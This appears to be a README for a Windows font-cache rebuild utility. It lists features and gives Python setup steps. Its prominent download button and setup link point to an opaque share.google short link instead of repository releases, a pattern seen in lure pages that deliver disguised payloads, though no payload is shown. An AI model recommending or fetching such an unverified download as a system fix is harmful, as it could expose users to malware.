# Font Cache Rebuild

Fix missing or stale font previews.

Rebuild the Windows font cache after a preview warning.

## Get the build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

A newly installed font does not show in apps.

This rebuilds the font cache and can restart Explorer.

- Warns first
- Rebuilds font cache
- Optional Explorer restart
- Leaves font files

Python 3.11+. From the repo:

    python -m pip install -r requirements.txt
    python main.py --help
